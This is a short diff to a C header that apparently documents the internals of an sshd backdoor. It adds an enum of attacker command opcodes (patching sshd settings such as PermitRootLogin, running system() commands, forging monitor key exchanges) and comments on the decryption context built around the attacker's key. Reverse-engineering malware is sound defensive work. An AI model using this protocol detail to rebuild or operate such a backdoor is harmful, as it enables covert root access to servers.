@@ -1477,6 +1477,13 @@ enum CommandFlags3 {
  X_FLAGS3_MONITOR_REQ_VAL = 0x3F
 };
 
+typedef enum {
+ MONITOR_CMD_CONTROL_PLANE = 0, /* Baseline command stream: updates sshd offsets/logging toggles and can stream continuation payloads through the forged monitor socket. */
+ MONITOR_CMD_PATCH_VARIABLES = 1, /* Rewrites sshd globals (PermitRootLogin/use_pam/log hooks) before resuming the monitor loop. */
+ MONITOR_CMD_SYSTEM_EXEC = 2, /* Runs attacker-provided setresuid/setresgid/system commands and optionally asks sshd_proxy_elevate to exit afterwards. */
+ MONITOR_CMD_PROXY_EXCHANGE = 3 /* Fully populate monitor_data_t and have sshd_proxy_elevate forge a MONITOR_REQ_KEYALLOWED exchange on the chosen socket. */
+} monitor_cmd_type_t;
+
 /*
  * Working context for RSA-related operations; caches the cloned modulus/exponent, parsed cmd flags, decrypted payload bytes, the 32-byte host-key digest slot, ChaCha nonce/IV snapshots, and the attacker’s unwrapped Ed448 key (whose low 32 bytes double as the ChaCha key) so run_backdoor_commands can replay decryptions without re-reading secret_data.
  */
@@ -1496,7 +1503,7 @@ typedef struct __attribute__((packed)) key_ctx {
  * Argument bundle that `run_backdoor_commands` hands to `sshd_proxy_elevate`: it carries the decoded cmd opcode, parsed cmd_arguments_t flags, cloned RSA modulus/exponent, payload body pointer/size, and the RSA handle borrowed from OpenSSL.
  */
 typedef struct __attribute__((packed)) monitor_data {
- u32 cmd_type; /* Attacker-defined opcode (0=NOP,1=patch vars,2=system(),3=proxy monitor exchange). */
+ monitor_cmd_type_t cmd_type; /* Attacker-defined opcode describing how sshd_proxy_elevate should respond (control-plane updates, sshd variable patches, system() exec, or forged monitor exchanges). */
  u32 cmd_type_padding; /* High dword of the ChaCha-derived cmd index; left unused but keeps the runtime_data union 64-bit aligned. */
  cmd_arguments_t *args; /* Pointer to the decoded cmd flag bytes pulled from the decrypted payload body. */
  const BIGNUM *rsa_n; /* Modulus cloned from the staged RSA key (used when forging keyallowed/keyverify exchanges). */
